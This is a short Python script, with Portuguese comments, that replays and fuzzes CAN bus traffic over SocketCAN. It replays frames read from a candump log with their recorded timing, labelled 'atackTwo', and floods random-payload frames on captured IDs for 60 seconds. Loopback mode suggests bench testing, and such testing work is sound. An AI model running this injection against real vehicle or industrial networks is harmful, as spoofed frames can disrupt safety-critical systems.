#!/usr/bin/env python
#Comando iniciar a CAN :   sudo ip link set can0 up type can bitrate 500000 loopback on
#comando pra salvar arquivo com timestamp candump can0 -t d &> testeLog.txt
from getch import getch
import time
import can
import random
can.rc['interface'] = 'socketcan'
can.rc['channel'] = 'can0'
can.rc['bitrate'] = 500000
from can.interface import Bus
msgToSend = []

def atackTwo(msgToSend):
    prev = time.time()
    stop = True
    while(stop):
        for i in range(0,2*5,2):
            msg = can.Message(
                arbitration_id=msgToSend[i][1], data=msgToSend[i][2], is_extended_id=True
            )
            time.sleep(msgToSend[i+1][0]*0.98)
            send_one(msg)
        actual = time.time()
        if((actual-prev)>60.0):
            stop = False

def send_one(msg):
    """Sends a single message."""
    with can.Bus() as bus:
        bus = Bus()
        

        try:
            bus.send(msg)
            print(f"Message sent on {bus.channel_info}")
        except can.CanError:
            print("Message NOT sent")

def infoGet():
    f = open("testeLog.txt", "r")
    lines = f.readlines()
    linesReady =[]
    
    
    for i in lines:
        linesReady.append(list(filter(lambda x: x!= "",i.split(" "))))
        linesReady[-1][-1] =linesReady[-1][-1].rstrip("\n")
    
    
    for i in linesReady:
        msgTime=float(i[0][1:-1])
        msgHeader=int(i[2],16)
        msgBody =[]
        if (len(i)>5):
            for j in i[4:]:
                msgBody.append(int(j,16))
        msgToSend.append((msgTime,msgHeader,msgBody))

if __name__ == "__main__":
    infoGet()
    while True:
        print("Press '1' to test 1")
        print("Press '2' to test 2")
        print("Press '3' to test 3")
        print("\nPress 's' to send a menssage to CAN BUS or press 'q' to Quit\n")
        pressedKey = getch()
        if pressedKey == 's': 
            send_one(msg = can.Message(
                arbitration_id=msgToSend[random.randrange(0,len(msgToSend)-1)][1], data=[random.randint(0,254),random.randint(0,254),random.randint(0,254),random.randint(0,254),random.randint(0,254),random.randint(0,254),random.randint(0,254),random.randint(0,254)], is_extended_id=True
            ))
        elif pressedKey == '1': 
            prev = time.time()
            stop = True
            while(stop):
                send_one(msg = can.Message(
                arbitration_id=msgToSend[random.randrange(0,len(msgToSend)-1)][1], data=[random.randint(0,254),random.randint(0,254),random.randint(0,254),random.randint(0,254),random.randint(0,254),random.randint(0,254),random.randint(0,254),random.randint(0,254)], is_extended_id=True
            ))
                actual = time.time()
                if((actual-prev)>60.0):
                    stop = False
        elif pressedKey == '2':
            
            atackTwo(msgToSend)
           
        elif pressedKey == '3':
            print("3")      
        elif pressedKey == 'q':    
            systems.exit()
        else:
            print ("\nKey Pressed:" + str(pressedKey))
    